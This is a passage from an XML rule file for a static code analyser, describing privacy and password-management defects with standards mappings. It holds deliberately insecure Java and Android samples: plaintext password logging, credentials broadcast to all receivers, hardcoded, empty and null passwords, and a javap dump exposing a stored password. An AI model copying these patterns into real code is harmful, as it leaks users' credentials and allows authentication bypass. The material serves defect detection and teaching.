							  Privacy violations occur when:<br><br>1. Private user information enters the program.<br><br>2. The data is written to an external location, such as the console, file system, or network.<br><br><br><b>Example 1:</b> The following code contains a logging statement that tracks the contents of records added to a database by storing them in a log file. Among other values that are stored, the <code>getPassword()</code> function returns the user-supplied plaintext password associated with the account.<br><br><pre><br>pass = getPassword();<br>...<br>dbmsLog.println(id+":"+pass+":"+type+":"+tstamp);<br></pre><br><br>The code in the example above logs a plaintext password to the filesystem. Although many developers trust the filesystem as a safe storage location for data, it should not be trusted implicitly, particularly when privacy is a concern.<br><br>Privacy is one of the biggest concerns in the mobile world for a couple of reasons. One of them is a much higher chance of device loss. The other has to do with inter-process communication between mobile applications. The essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. Sensitive information should never be part of inter-process communication between mobile applications.<br><br><b>Example 2:</b> The code below reads username and password for a given site from an Android WebView store and broadcasts them to all the registered receivers.<br><pre><br>...<br>webview.setWebViewClient(new WebViewClient() {<br>  public void onReceivedHttpAuthRequest(WebView view,<br>        HttpAuthHandler handler, String host, String realm) {<br>    String[] credentials = view.getHttpAuthUsernamePassword(host, realm);<br>    String username = credentials[0];<br>    String password = credentials[1];<br>    Intent i = new Intent();<br>    i.setAction("SEND_CREDENTIALS");<br>    i.putExtra("username", username);<br>    i.putExtra("password", password);<br>    view.getContext().sendBroadcast(i);<br>  }<br>});<br>...<br></pre><br><br>There are several problems with this example. First of all, by default, WebView credentials are stored in plaintext and are not hashed. So if a user has a rooted device (or uses an emulator), she is able to read stored passwords for given sites. Second, plaintext credentials are broadcast to all the registered receivers, which means that any receiver registered to listen to intents with the <code>SEND_CREDENTIALS</code> action will receive the message. The broadcast is not even protected with a permission to limit the number of recipients, even though in this case, we do not recommend using permissions as a fix.<br><br>Private data can enter a program in a variety of ways:<br><br>- Directly from the user in the form of a password or personal information<br><br>- Accessed from a database or other data store by the application<br><br>- Indirectly from a partner or other third party<br><br>Typically, in the context of the mobile world, this private information would include (along with passwords, SSNs and other general personal information):<br><br>- Location<br><br>- Cell phone number<br><br>- Serial numbers and device IDs<br><br>- Network Operator information<br><br>- Voicemail information<br><br>Sometimes data that is not labeled as private can have a privacy implication in a different context. For example, student identification numbers are usually not considered private because there is no explicit and publicly-available mapping to an individual student's personal information. However, if a school generates identification numbers based on student social security numbers, then the identification numbers should be considered private.<br><br>Security and privacy concerns often seem to compete with each other. From a security perspective, you should record all important operations so that any anomalous activity can later be identified. However, when private data is involved, this practice can create risk.<br><br>Although there are many ways in which private data can be handled unsafely, a common risk stems from misplaced trust. Programmers often trust the operating environment in which a program runs, and therefore believe that it is acceptable to store private information on the file system, in the registry, or in other locally-controlled resources. However, even if access to certain resources is restricted, this does not guarantee that the individuals who do have access can be trusted. For example, in 2004, an unscrupulous employee at AOL sold approximately 92 million private customer e-mail addresses to a spammer marketing an offshore gambling web site [1].<br><br>In response to such high-profile exploits, the collection and management of private data is becoming increasingly regulated. Depending on its location, the type of business it conducts, and the nature of any private data it handles, an organization may be required to comply with one or more of the following federal and state regulations:<br><br>- Safe Harbor Privacy Framework [3]<br><br>- Gramm-Leach Bliley Act (GLBA) [4]<br><br>- Health Insurance Portability and Accountability Act (HIPAA) [5]<br><br>- California SB-1386 [6]<br><br>Despite these regulations, privacy violations continue to occur with alarming frequency.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] J. Oates <em>AOL man pleads guilty to selling 92m email addies</em> The Register<br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[8]  <em>California SB-1386</em> Government of the State of California<br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 359</em> <br></p>
																									   <p>[10]  <em>Financial Privacy: The Gramm-Leach Bliley Act (GLBA)</em> Federal Trade Commission<br></p>
																									   <p>[11]  <em>Health Insurance Portability and Accountability Act (HIPAA)</em> U.S. Department of Human Services<br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[14]  <em>Privacy Initiatives</em> U.S. Federal Trade Commission<br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.2, Requirement 3.4, Requirement 6.5.5, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.2, Requirement 3.4, Requirement 8.2.1</em> <br></p>
																									   <p>[19]  <em>Safe Harbor Privacy Framework</em> U.S. Department of Commerce<br></p>
																									   <p>[20]  <em>SQLCipher.</em> <br></p>
																									   <p>[21] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_password_management</key>
		<internalKey>Security Features/Password Management</internalKey>
		<name>Password Management</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing a password in plaintext can result in a system compromise.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Password management issues occur when a password is stored in plaintext in an application's properties or configuration file.<br><br><b>Example 1:</b> The following code reads a password from a properties file and uses the password to connect to a database.<br><br><pre><br>...<br>Properties prop = new Properties();<br>prop.load(new FileInputStream("config.properties"));<br>String password = prop.getProperty("password");<br><br>DriverManager.getConnection(url, usr, password);<br>...<br></pre><br><br>This code will run successfully, but anyone who has access to config.properties can read the value of <code>password</code>. If a devious employee has access to this information, they can use it to break into the system.<br><br>In the mobile world, password management is even trickier, considering a much higher chance of device loss.<br><b>Example 2:</b> The code below reads username and password from an Android WebView store and uses them to setup authentication for viewing protected pages.<br><pre><br>...<br>webview.setWebViewClient(new WebViewClient() {<br>  public void onReceivedHttpAuthRequest(WebView view,<br>        HttpAuthHandler handler, String host, String realm) {<br>    String[] credentials = view.getHttpAuthUsernamePassword(host, realm);<br>    String username = credentials[0];<br>    String password = credentials[1];<br>    handler.proceed(username, password);<br>  }<br>});<br>...<br></pre><br><br>By default, WebView credentials are stored in plaintext and are not hashed. So if a user has a rooted device (or uses an emulator), she is able to read stored passwords for given sites.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 256</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>
																									   <p>[18]  <em>SQLCipher.</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_password_management_empty_password</key>
		<internalKey>Security Features/Password Management/Empty Password
		</internalKey>
		<name>Password Management: Empty Password</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Empty passwords can compromise system security in a way that cannot be easily remedied.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is never a good idea to assign an empty string to a password variable. If the empty password is used to successfully authenticate against another system, then the corresponding account's security is likely compromised because it accepts an empty password. If the empty password is merely a placeholder until a legitimate value can be assigned to the variable, then it can confuse anyone unfamiliar with the code and potentially cause problems on unexpected control flow paths.<br><br><br><br><b>Example 1:</b> The code below attempts to connect to a database with an empty password.<br><pre><br>    ...<br>    DriverManager.getConnection(url, "scott", "");<br>    ...<br></pre><br><br>If the code in Example 1 succeeds, it indicates that the database user account "scott" is configured with an empty password, which can be easily guessed by an attacker. Even worse, once the program has shipped, updating the account to use a non-empty password will require a code change.<br><br><b>Example 2:</b> The code below initializes a password variable to an empty string, attempts to read a stored value for the password, and compares it against a user-supplied value.<br><br><pre><br>    ...<br>    String storedPassword = "";<br>    String temp;<br><br>    if ((temp = readPassword()) != null) {<br>        storedPassword = temp;<br>    }<br><br>    if(storedPassword.equals(userPassword))<br>        // Access protected resources<br>        ...<br>    }<br>    ...<br></pre><br><br>If <code>readPassword()</code> fails to retrieve the stored password due to a database error or another problem, then an attacker could trivially bypass the password check by providing an empty string for <code>userPassword</code>.<br><br>In the mobile world, password management is even trickier, considering a much higher chance of device loss.<br><b>Example 3:</b> The code below initializes username and password variables to empty strings, reads credentials from an Android WebView store if they have not been previously rejected by the server for the current request, and uses them to setup authentication for viewing protected pages.<br><pre><br>...<br>webview.setWebViewClient(new WebViewClient() {<br>  public void onReceivedHttpAuthRequest(WebView view,<br>        HttpAuthHandler handler, String host, String realm) {<br>    String username = "";<br>    String password = "";<br><br>    if (handler.useHttpAuthUsernamePassword()) {<br>      String[] credentials = view.getHttpAuthUsernamePassword(host, realm);<br>      username = credentials[0];<br>      password = credentials[1];<br>    }<br>    handler.proceed(username, password);<br>  }<br>});<br>...<br></pre><br><br>Similar to Example 2, if <code>useHttpAuthUsernamePassword()</code> returns <code>false</code>, an attacker will be able to view protected pages by supplying an empty password.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 259</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 259</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>
																									   <p>[19]  <em>SQLCipher.</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_password_management_hardcoded_password</key>
		<internalKey>Security Features/Password Management/Hardcoded Password
		</internalKey>
		<name>Password Management: Hardcoded Password</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Hardcoded passwords can compromise system security in a way that cannot be easily remedied.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is never a good idea to hardcode a password. Not only does hardcoding a password allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password cannot be changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability.<br><br><br><b>Example 1:</b> The following code uses a hardcoded password to connect to a database:<br><br><pre><br>...<br>DriverManager.getConnection(url, "scott", "tiger");<br>...<br></pre><br><br>This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for the application they can use the <code>javap -c</code> command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:<br><br><pre><br>javap -c ConnMngr.class<br><br>22: ldc   #36; //String jdbc:mysql://ixne.com/rxsql<br>24: ldc   #38; //String scott<br>26: ldc   #17; //String tiger<br></pre><br><br>In the mobile world, password management is even trickier, considering a much higher chance of device loss.<br><b>Example 2:</b> The code below uses hardcoded username and password to setup authentication for viewing protected pages with Android's WebView.<br><pre><br>...<br>webview.setWebViewClient(new WebViewClient() {<br>  public void onReceivedHttpAuthRequest(WebView view,<br>        HttpAuthHandler handler, String host, String realm) {<br>    handler.proceed("guest", "allow");<br>  }<br>});<br>...<br></pre><br><br>Similar to Example 1, this code will run successfully, but anyone who has access to it will have access to the password.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 259, CWE ID 798</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 259</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 798</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 798</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>
																									   <p>[21]  <em>SQLCipher.</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_password_management_null_password</key>
		<internalKey>Security Features/Password Management/Null Password
		</internalKey>
		<name>Password Management: Null Password</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Null passwords can compromise security.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Assigning <code>null</code> to password variables is a bad idea because it can allow attackers to bypass password verification or might indicate that resources are protected by an empty password.<br><br><br><br><b>Example 1:</b> The code below initializes a password variable to <code>null</code>, attempts to read a stored value for the password, and compares it against a user-supplied value.<br><br><pre><br>    ...<br>    String storedPassword = null;<br>    String temp;<br><br>    if ((temp = readPassword()) != null) {<br>        storedPassword = temp;<br>    }<br><br>    if(Utils.verifyPassword(userPassword, storedPassword))<br>        // Access protected resources<br>        ...<br>    }<br>    ...<br></pre><br><br>If <code>readPassword()</code> fails to retrieve the stored password due to a database error or another problem, then an attacker could trivially bypass the password check by providing a null value for <code>userPassword</code>.<br><br>In the mobile world, password management is even trickier, considering a much higher chance of device loss.<br><b>Example 2:</b> The code below initializes username and password variables to <code>null</code>, reads credentials from an Android WebView store if they have not been previously rejected by the server for the current request, and uses them to setup authentication for viewing protected pages.<br><pre><br>...<br>webview.setWebViewClient(new WebViewClient() {<br>  public void onReceivedHttpAuthRequest(WebView view,<br>        HttpAuthHandler handler, String host, String realm) {<br>    String username = null;<br>    String password = null;<br><br>    if (handler.useHttpAuthUsernamePassword()) {<br>      String[] credentials = view.getHttpAuthUsernamePassword(host, realm);<br>      username = credentials[0];<br>      password = credentials[1];<br>    }<br>    handler.proceed(username, password);<br>  }<br>});<br>...<br></pre><br><br>Similar to Example 1, if <code>useHttpAuthUsernamePassword()</code> returns <code>false</code>, an attacker will be able to view protected pages by supplying a null password.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 259</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 259</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>
																									   <p>[19]  <em>SQLCipher.</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_password_management_password_in_comment</key>
		<internalKey>Security Features/Password Management/Password in Comment
		</internalKey>
		<name>Password Management: Password in Comment</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing passwords or password details in plaintext anywhere in the system or system code can compromise system security in a way that cannot be easily remedied.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords.  Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability.<br><br><br><b>Example:</b> The following comment specifies the default password to connect to a database:<br><br><pre><br>...<br>// Default username for database connection is "scott"<br>// Default password for database connection is "tiger"<br>...<br></pre><br><br>This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 615</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_password_management_password_in_redirect</key>
		<internalKey>Security Features/Password Management/Password in
			Redirect
		</internalKey>
		<name>Password Management: Password in Redirect</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Sending a password as part of an HTTP redirect will cause the password to be displayed, logged, or stored in a cache.
							</p>
							<h2>EXPLANATION</h2>
							<p>
